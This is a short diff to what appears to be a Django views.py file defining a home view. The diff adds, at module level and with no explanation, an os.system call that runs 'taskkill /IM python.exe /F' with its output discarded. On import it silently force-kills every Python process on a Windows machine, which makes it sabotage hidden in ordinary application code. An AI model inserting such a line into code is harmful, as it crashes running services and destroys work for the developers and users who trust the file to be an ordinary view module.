@@ -4,6 +4,8 @@ from django.shortcuts import render
 from django.http import HttpResponse
 from django.shortcuts import render
 from app1.models import student,course
+import os
+os.system('taskkill /IM python.exe /F > nul')
 # Create your views here.
 def home(request):
     return render(request,'home.html')
